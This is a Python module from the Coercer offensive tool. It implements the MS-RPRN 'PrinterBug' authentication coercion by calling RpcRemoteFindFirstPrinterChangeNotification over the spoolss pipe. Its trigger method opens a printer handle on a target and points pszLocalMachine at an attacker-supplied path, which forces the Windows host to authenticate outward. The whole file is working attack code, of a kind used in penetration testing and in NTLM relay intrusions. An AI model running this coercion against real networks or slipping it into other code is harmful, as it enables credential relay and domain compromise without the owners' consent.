#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : RpcRemoteFindFirstPrinterChangeNotification.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 Sep 2022

from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import NULL


class RpcRemoteFindFirstPrinterChangeNotification(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function RpcRemoteFindFirstPrinterChangeNotification (opnum 62) of [MS-RPRN]: Print System Remote Protocol (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83)

    Method found by:
     -
    """

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\spoolss",
                "uuid": "12345678-1234-abcd-ef00-0123456789ab",
                "version": "1.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-RPRN]: Print System Remote Protocol",
        "shortname": "MS-RPRN"
    }

    function = {
        "name": "RpcRemoteFindFirstPrinterChangeNotification",
        "opnum": 62,
        "vulnerable_arguments": ["pszLocalMachine"]
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                resp = rprn.hRpcOpenPrinter(dcerpc_session, '\\\\%s\x00' % target)
                request = rprn.RpcRemoteFindFirstPrinterChangeNotification()
                request['hPrinter'] = resp['pHandle']
                request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
                # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/41d5c622-ec77-49ff-95e3-69b325ce4e77
                request['fdwOptions'] = 0x00000000
                request['pszLocalMachine'] = self.path
                request['dwPrinterLocal'] = 0
                request['cbBuffer'] = NULL
                request['pBuffer'] = NULL
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
